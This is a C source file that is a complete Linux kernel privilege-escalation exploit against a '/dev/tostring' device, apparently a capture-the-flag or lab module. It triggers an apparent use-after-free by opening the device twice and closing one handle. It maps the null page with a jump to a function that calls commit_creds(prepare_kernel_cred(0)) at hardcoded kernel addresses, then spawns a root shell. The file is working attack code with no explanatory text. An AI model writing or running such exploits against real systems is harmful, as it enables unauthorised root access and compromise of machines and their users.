#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<errno.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<sys/mman.h>

#define DEVICE_FILE "/dev/tostring" 

typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0xffffffff8107ab70;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xffffffff8107af00;
int fd1,fd2;
void privesc(void){
	commit_creds(prepare_kernel_cred(0));
}
void exploit(void){
	fd1=open(DEVICE_FILE,O_RDWR);
	fd2=open(DEVICE_FILE,O_RDWR);
	close(fd1);
	char *call=(char *)mmap(NULL,0x3000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);
	memset(call,0,0x3000);
	call[0]='\xff';
	call[1]='\x25';
	*(unsigned long *)&call[2]=0;
	*(unsigned long *)&call[6]=(unsigned long)&privesc;
	read(fd2,NULL,0);
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}
int main(void){
	exploit();
	return 0;
}

